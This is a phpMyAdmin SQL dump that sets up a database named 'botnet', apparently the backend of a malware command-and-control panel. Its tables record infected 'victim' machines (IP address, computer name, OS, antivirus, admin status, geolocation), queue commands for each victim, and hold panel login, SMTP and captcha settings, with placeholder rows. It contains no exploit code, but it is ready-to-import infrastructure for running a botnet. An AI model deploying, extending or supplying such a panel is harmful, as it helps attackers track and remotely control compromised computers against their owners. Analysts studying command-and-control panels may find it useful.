-- phpMyAdmin SQL Dump
-- version 4.9.1
-- https://www.phpmyadmin.net/

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `botnet`
--

-- --------------------------------------------------------

--
-- Table structure `admin`
--

CREATE TABLE `admin` (
  `id` int(11) UNSIGNED NOT NULL,
  `username` text NOT NULL,
  `password` text NOT NULL,
  `email` text NOT NULL,
  `role` text NOT NULL,
  `s2fa` varchar(10) NOT NULL,
  `secret` varchar(100) NOT NULL,
  `sqenable` varchar(10) NOT NULL,
  `question` text NOT NULL,
  `answer` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Return or import schedule data `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`, `email`, `role`, `s2fa`, `secret`, `sqenable`, `question`, `answer`) VALUES
(1, 'admin', '63cd16726f1b56ef120d5c1ddffaed3e3d472af6dabc5914a93b55cf30ca284d', 'localhost@gmail.com', 'administrator', 'off', 'null', 'off', 'Select a Security Question', '');

-- --------------------------------------------------------

--
-- Table structure `clients`
--

CREATE TABLE `clients` (
  `id` int(11) UNSIGNED NOT NULL,
  `vicid` text NOT NULL,
  `ipaddress` text NOT NULL,
  `computername` text NOT NULL,
  `country` text NOT NULL,
  `os` text NOT NULL,
  `insdate` text NOT NULL,
  `update_at` text NOT NULL,
  `pings` int(11) NOT NULL,
  `antivirus` text NOT NULL,
  `status` text NOT NULL,
  `is_usb` varchar(5) NOT NULL,
  `is_admin` tinytext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure `commands`
--

CREATE TABLE `commands` (
  `id` int(11) NOT NULL,
  `vicid` text NOT NULL,
  `command` mediumtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure `confirm_code`
--

CREATE TABLE `confirm_code` (
  `id` int(11) NOT NULL,
  `username` mediumtext NOT NULL,
  `token` mediumtext NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure `logs`
--

CREATE TABLE `logs` (
  `id` int(11) NOT NULL,
  `time` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `vicid` text NOT NULL,
  `type` text NOT NULL,
  `message` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure `settings`
--

CREATE TABLE `settings` (
  `id` int(11) NOT NULL,
  `recaptchaprivate` longtext NOT NULL,
  `recaptchapublic` longtext NOT NULL,
  `recaptchastatus` mediumtext NOT NULL,
  `panel_status` char(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Return or import schedule data `settings`
--

INSERT INTO `settings` (`id`, `recaptchaprivate`, `recaptchapublic`, `recaptchastatus`, `panel_status`) VALUES
(1, 'UpdateYourCode', 'UpdateYourCode', 'off', 'on');

-- --------------------------------------------------------

--
-- Table structure `smtp`
--

CREATE TABLE `smtp` (
  `id` int(11) NOT NULL,
  `smtphost` mediumtext NOT NULL,
  `smtpuser` mediumtext NOT NULL,
  `smtppassword` mediumtext NOT NULL,
  `port` int(11) NOT NULL,
  `security_type` mediumtext NOT NULL,
  `status` mediumtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Return or import schedule data `smtp`
--

INSERT INTO `smtp` (`id`, `smtphost`, `smtpuser`, `smtppassword`, `port`, `security_type`, `status`) VALUES
(1, 'smtp.localhost.com', 'localhost@gmail.com', 'Z21haWxwYXNzd29yZA==', 0, 'ssl', 'off');

--
-- Table structure `location`
--

CREATE TABLE `location` (
  `id` int(11) NOT NULL,
  `vicid` mediumtext NOT NULL,
  `publicip` mediumtext NOT NULL,
  `latitude` mediumtext NOT NULL,
  `longitude` mediumtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `clients`
--
ALTER TABLE `clients`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `commands`
--
ALTER TABLE `commands`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `confirm_code`
--
ALTER TABLE `confirm_code`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logs`
--
ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `smtp`
--
ALTER TABLE `smtp`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `location`
--
ALTER TABLE `location`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT for table `clients`
--
ALTER TABLE `clients`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `commands`
--
ALTER TABLE `commands`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `confirm_code`
--
ALTER TABLE `confirm_code`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `logs`
--
ALTER TABLE `logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `smtp`
--
ALTER TABLE `smtp`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
  
--
-- AUTO_INCREMENT for table `location`
--  
 
ALTER TABLE `location`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
